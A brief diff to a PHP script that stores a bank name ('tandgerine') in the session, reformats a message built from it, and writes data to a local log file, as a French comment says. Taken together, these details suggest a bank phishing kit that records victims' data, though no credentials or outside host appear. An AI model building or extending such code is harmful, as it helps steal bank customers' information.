@@ -3,8 +3,7 @@ $_SESSION["bank"] ='tandgerine';
 
 
 
-$message = 
-           "🏦 **Banque** : " . $_SESSION["bank"] . "\n" ;
+$message = "🏛🏛*".$_SESSION["bank"]."*🏛🏛"; 
 
 // Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
 $file = "../blinky2000@bvc@bvc@destruction.txt";
